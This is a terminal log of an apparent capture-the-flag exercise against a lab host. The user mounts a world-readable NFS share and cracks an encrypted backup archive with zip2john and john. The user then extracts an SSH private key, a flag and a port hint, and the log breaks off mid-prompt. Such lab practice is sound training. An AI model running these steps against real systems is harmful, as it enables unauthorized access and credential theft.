                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ telnet 10.10.151.140     
Trying 10.10.151.140...
Connected to 10.10.151.140.
Escape character is '^]'.
550 12345 0f8008707ff07ff8000008088ff800000000f7000000f800808ff00Connection closed by foreign host.
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ ftp 10.10.151.140
Connected to 10.10.151.140.
550 12345 0f7000f800770008777 go to port 12345 80008f7f700880cf00421 Service not available, remote server has closed connection.
ftp> ls
Not connected.
ftp> exit
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ ftp 10.10.151.140 12345
Connected to 10.10.151.140.
NFS shares are cool, especially when they are misconfigured
ftp> ls
Not connected.
ftp> exit
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ showmount -e 10.10.151.140           
Export list for 10.10.151.140:
/home/nfs *
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ ls /mnt                          
hack  nfs
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ mkdir /mnt/server_from_hell
mkdir: cannot create directory ‘/mnt/server_from_hell’: Permission denied
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ sudo mkdir /mnt/server_from_hell
[sudo] password for alvan: 
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ sudo mount -t nfs 10.10.151.140:/home/nfs /mnt/server_from_hell
tp>                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ ls /mnt/server_from_hell
backup.zip
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ cd /mnt/server_from_hell
                                                                                                                    
┌──(alvan㉿vbox)-[/mnt/server_from_hell]
└─$ ls                      
backup.zip
                                                                                                                    
┌──(alvan㉿vbox)-[/mnt/server_from_hell]
└─$ unzip backup.zip                         
Archive:  backup.zip
checkdir error:  cannot create home
                 Read-only file system
                 unable to process home/hades/.ssh/.
[backup.zip] home/hades/.ssh/id_rsa password: 
password incorrect--reenter: 
password incorrect--reenter: 
   skipping: home/hades/.ssh/id_rsa  incorrect password
[backup.zip] home/hades/.ssh/hint.txt password: 
   skipping: home/hades/.ssh/hint.txt  incorrect password
   skipping: home/hades/.ssh/authorized_keys  incorrect password
   skipping: home/hades/.ssh/flag.txt  incorrect password
   skipping: home/hades/.ssh/id_rsa.pub  incorrect password


                                                                                                                    
┌──(alvan㉿vbox)-[/mnt/server_from_hell]
└─$ 
                                                                                                                    
┌──(alvan㉿vbox)-[/mnt/server_from_hell]
└─$ 
                                                                                                                    
┌──(alvan㉿vbox)-[/mnt/server_from_hell]
└─$ zip2john backup.zip > backup_hash      
zsh: read-only file system: backup_hash
                                                                                                                    
┌──(alvan㉿vbox)-[/mnt/server_from_hell]
└─$ sudo zip2john backup.zip > backup_hash
zsh: read-only file system: backup_hash
                                                                                                                    
┌──(alvan㉿vbox)-[/mnt/server_from_hell]
└─$ ls -la                  
total 16
drwxr-xr-x 2 nobody nogroup 4096 Sep 15  2020 .
drwxr-xr-x 5 root   root    4096 Sep  1 19:12 ..
-rw-r--r-- 1 root   root    4534 Sep 15  2020 backup.zip
                                                                                                                    
┌──(alvan㉿vbox)-[/mnt/server_from_hell]
└─$ sudo zip2john backup.zip >hash        
zsh: read-only file system: hash
                                                                                                                    
┌──(alvan㉿vbox)-[/mnt/server_from_hell]
└─$ sudo zip2john backup.zip      
ver 1.0 backup.zip/home/hades/.ssh/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 backup.zip/home/hades/.ssh/id_rsa PKZIP Encr: TS_chk, cmplen=2107, decmplen=3369, crc=6F72D66B ts=B16D cs=b16d type=8
ver 1.0 efh 5455 efh 7875 ** 2b ** backup.zip/home/hades/.ssh/hint.txt PKZIP Encr: TS_chk, cmplen=22, decmplen=10, crc=F51A7381 ts=B16D cs=b16d type=0
ver 2.0 efh 5455 efh 7875 backup.zip/home/hades/.ssh/authorized_keys PKZIP Encr: TS_chk, cmplen=602, decmplen=736, crc=1C4C509B ts=B16D cs=b16d type=8
ver 1.0 efh 5455 efh 7875 ** 2b ** backup.zip/home/hades/.ssh/flag.txt PKZIP Encr: TS_chk, cmplen=45, decmplen=33, crc=2F9682FA ts=B16D cs=b16d type=0
ver 2.0 efh 5455 efh 7875 backup.zip/home/hades/.ssh/id_rsa.pub PKZIP Encr: TS_chk, cmplen=602, decmplen=736, crc=1C4C509B ts=B16D cs=b16d type=8
backup.zip:$pkzip$5*1*1*0*0*24*b16d*80696ae8c675f1ef5df2906662a9a7ce07485c18db37feb8b97ed560e572ce5cf805afb4*1*0*8*24*b16d*7d8849d53ca2d690df91b5f8ff302e0eae9c13c7fbb169b6d935abdfef8c00e339f84c09*1*0*8*24*b16d*f08eeb86fce5cd5368b57ab3b4848df3b526da3fc467bc17c191210c596608311a8a5cf1*1*0*8*24*b16d*7168a30d9a64dc6df0956c675b62ff980dbd4f16fe022b1abb1c75e1943c97e47bbdc5f5*2*0*16*a*f51a7381*8e5*52*0*16*b16d*5050fa8c08f92051a2cad9941e8a8f4522a8c5dbfa32*$/pkzip$::backup.zip:home/hades/.ssh/hint.txt, home/hades/.ssh/flag.txt, home/hades/.ssh/authorized_keys, home/hades/.ssh/id_rsa.pub, home/hades/.ssh/id_rsa:backup.zip
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
                                                                                                                    
┌──(alvan㉿vbox)-[/mnt/server_from_hell]
└─$ ftp 10.10.151.140 51                
Connected to 10.10.151.140.
220 l-B FTP server (NetWare v2728) ready.
Name (10.10.151.140:alvan): anonymous

ftp: Login failed
ftp> exit
ftp: lostpeer due to signal 13
                                                                                                                    
┌──(alvan㉿vbox)-[/mnt/server_from_hell]
└─$ ftp 10.10.151.140 51
Connected to 10.10.151.140.
220 l-B FTP server (NetWare v2728) ready.
Name (10.10.151.140:alvan): 

ftp: Login failed
ftp> exit
ftp: lostpeer due to signal 13
                                                                                                                    
┌──(alvan㉿vbox)-[/mnt/server_from_hell]
└─$ cd ~/THM/ctf                               
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ mv /mnt/server_from_hell/backup.zip .      
mv: cannot remove '/mnt/server_from_hell/backup.zip': Read-only file system
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ zip2john backup.zip > backup_hash
ver 1.0 backup.zip/home/hades/.ssh/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 backup.zip/home/hades/.ssh/id_rsa PKZIP Encr: TS_chk, cmplen=2107, decmplen=3369, crc=6F72D66B ts=B16D cs=b16d type=8
ver 1.0 efh 5455 efh 7875 ** 2b ** backup.zip/home/hades/.ssh/hint.txt PKZIP Encr: TS_chk, cmplen=22, decmplen=10, crc=F51A7381 ts=B16D cs=b16d type=0
ver 2.0 efh 5455 efh 7875 backup.zip/home/hades/.ssh/authorized_keys PKZIP Encr: TS_chk, cmplen=602, decmplen=736, crc=1C4C509B ts=B16D cs=b16d type=8
ver 1.0 efh 5455 efh 7875 ** 2b ** backup.zip/home/hades/.ssh/flag.txt PKZIP Encr: TS_chk, cmplen=45, decmplen=33, crc=2F9682FA ts=B16D cs=b16d type=0
ver 2.0 efh 5455 efh 7875 backup.zip/home/hades/.ssh/id_rsa.pub PKZIP Encr: TS_chk, cmplen=602, decmplen=736, crc=1C4C509B ts=B16D cs=b16d type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ cat backup_hash
backup.zip:$pkzip$5*1*1*0*0*24*b16d*80696ae8c675f1ef5df2906662a9a7ce07485c18db37feb8b97ed560e572ce5cf805afb4*1*0*8*24*b16d*7d8849d53ca2d690df91b5f8ff302e0eae9c13c7fbb169b6d935abdfef8c00e339f84c09*1*0*8*24*b16d*f08eeb86fce5cd5368b57ab3b4848df3b526da3fc467bc17c191210c596608311a8a5cf1*1*0*8*24*b16d*7168a30d9a64dc6df0956c675b62ff980dbd4f16fe022b1abb1c75e1943c97e47bbdc5f5*2*0*16*a*f51a7381*8e5*52*0*16*b16d*5050fa8c08f92051a2cad9941e8a8f4522a8c5dbfa32*$/pkzip$::backup.zip:home/hades/.ssh/hint.txt, home/hades/.ssh/flag.txt, home/hades/.ssh/authorized_keys, home/hades/.ssh/id_rsa.pub, home/hades/.ssh/id_rsa:backup.zip
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ john -w /usr/share/wordlists/rockyou.txt backup_hash
Warning: only loading hashes of type "tripcode", but also saw type "descrypt"
Use the "--format=descrypt" option to force loading hashes of that type instead
Warning: only loading hashes of type "tripcode", but also saw type "pix-md5"
Use the "--format=pix-md5" option to force loading hashes of that type instead
Warning: only loading hashes of type "tripcode", but also saw type "mysql"
Use the "--format=mysql" option to force loading hashes of that type instead
Warning: only loading hashes of type "tripcode", but also saw type "oracle"
Use the "--format=oracle" option to force loading hashes of that type instead
Warning: only loading hashes of type "tripcode", but also saw type "Raw-SHA1"
Use the "--format=Raw-SHA1" option to force loading hashes of that type instead
Warning: only loading hashes of type "tripcode", but also saw type "LM"
Use the "--format=LM" option to force loading hashes of that type instead
Warning: only loading hashes of type "tripcode", but also saw type "Raw-SHA1-AxCrypt"
Use the "--format=Raw-SHA1-AxCrypt" option to force loading hashes of that type instead
Warning: only loading hashes of type "tripcode", but also saw type "bfegg"
Use the "--format=bfegg" option to force loading hashes of that type instead
Warning: invalid UTF-8 seen reading /usr/share/wordlists/rockyou.txt
Session aborted
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt backup_hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
zxcvbnm          (backup.zip)     
1g 0:00:00:00 DONE (2025-09-01 19:29) 8.333g/s 34133p/s 34133c/s 34133C/s 123456..oooooo
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ ls    
apache-certificate.crt  capture.pcap    hack               publisher  rsa.pub     task.txt    willow_hack  zeno3c0
apache.key              carnage.pcap    hacker_willow_rsa  reports    script.py   update.txt  willow_hash
backup.zip              carnage.pcap.1  locks.txt          root.txt   shell.php   user.jpg    willow_rsa
backup_hash             exploit.py      loot               rsa        stealer.js  willow.md   writeup.md
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ ls hack
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ mv backup.zip hack                   
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ cd hack          
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf/hack]
└─$ unzip backup.zip
Archive:  backup.zip
   creating: home/hades/.ssh/
[backup.zip] home/hades/.ssh/id_rsa password: 
password incorrect--reenter: 
  inflating: home/hades/.ssh/id_rsa  
 extracting: home/hades/.ssh/hint.txt  
  inflating: home/hades/.ssh/authorized_keys  
 extracting: home/hades/.ssh/flag.txt  
  inflating: home/hades/.ssh/id_rsa.pub  
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf/hack]
└─$ ls     
backup.zip  home
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf/hack]
└─$ ls home
hades
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf/hack]
└─$ ls home/hades
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf/hack]
└─$ ls home/hades/.ssh
authorized_keys  flag.txt  hint.txt  id_rsa  id_rsa.pub
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf/hack]
└─$ cd home/hades/.ssh
                                                                                                                    
┌──(alvan㉿vbox)-[~/…/hack/home/hades/.ssh]
└─$ cat flag.txt      
thm{h0p3_y0u_l1k3d_th3_f1r3w4ll}
                                                                                                                    
┌──(alvan㉿vbox)-[~/…/hack/home/hades/.ssh]
└─$ cat hint.txt
2500-4500
                                                                                                                    
┌──(al
